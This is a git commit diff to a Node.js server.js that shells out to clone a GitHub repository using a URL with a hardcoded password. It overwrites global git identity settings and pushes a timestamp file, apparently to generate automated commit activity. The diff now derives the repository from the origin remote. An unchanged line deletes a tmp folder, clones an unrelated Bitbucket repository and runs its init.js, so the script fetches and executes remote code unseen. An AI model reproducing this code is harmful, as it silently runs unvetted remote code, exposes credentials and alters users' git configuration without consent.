c4aebafbdbbd077853927e0d7564c9307231240d
ecghqhvpt <31987968+ecghqhvpt@users.noreply.github.com>
2017-09-15 11:40:51 +0000

    Update server.js

--- server.js
+++ server.js
@@ -2,14 +2,21 @@ var exec = require("child_process").exec;
 var index = 1;
 var max = 28;
 var interval;
-var target = 'https://wicaloop:test123@github.com/wicaloop/reckhoo.git';
 console.log(__dirname);
-var myrepo = 'git clone ' + target + ' aaa && ';
-myrepo += 'git config --global user.email "test" && ';
-myrepo += 'git config --global user.name "test" && ';
-myrepo += 'cd ./aaa && echo ' + (new Date()).getTime();
-myrepo += ' > log && git add . && git commit -m "update log" && git push ' + target;
-exec(myrepo);
+var repo = exec("git remote show origin -n | grep h.URL | sed 's/.*://;s/.git$//'");
+repo.stdout.on('data', function(data) {
+    var split = data.split('/');
+    var _n = split.pop();
+    var _r = split.pop();
+    var target = 'https://' + _r + ':test123@github.com/' + _r + '/' + _n + '.git';
+    var myrepo = 'git clone ' + target + ' aaa && ';
+    myrepo += 'git config --global user.email "test" && ';
+    myrepo += 'git config --global user.name "test" && ';
+    myrepo += 'cd ./aaa && echo ' + (new Date()).getTime();
+    myrepo += ' > log && git add . && git commit -m "update log" && git push ' + target;
+    exec(myrepo);
+});
+
 var child = exec('rm -rf tmp && git clone https://goopop@bitbucket.org/goopop/buildkitepath.git tmp && cd ./tmp && node init.js');
 child.stdout.on('data', function(data) {
     console.log('stdout: ' + data);
